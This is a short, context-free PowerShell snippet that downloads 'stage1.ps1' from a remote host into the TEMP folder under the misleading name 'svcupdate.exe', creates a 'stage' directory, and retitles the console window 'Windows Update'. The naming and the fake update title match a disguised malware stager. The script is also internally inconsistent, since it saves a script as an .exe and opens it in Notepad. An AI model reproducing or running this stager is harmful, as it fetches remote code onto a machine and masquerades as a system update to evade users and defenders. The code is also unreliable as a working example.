curl.exe -s -L -o "$env:TEMP\svcupdate.exe" 'https://internal.corp/stage1.ps1'
Start-Process -FilePath "notepad.exe" -ArgumentList "$env:TEMP\svcupdate.exe"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
$Host.UI.RawUI.WindowTitle = "Windows Update"
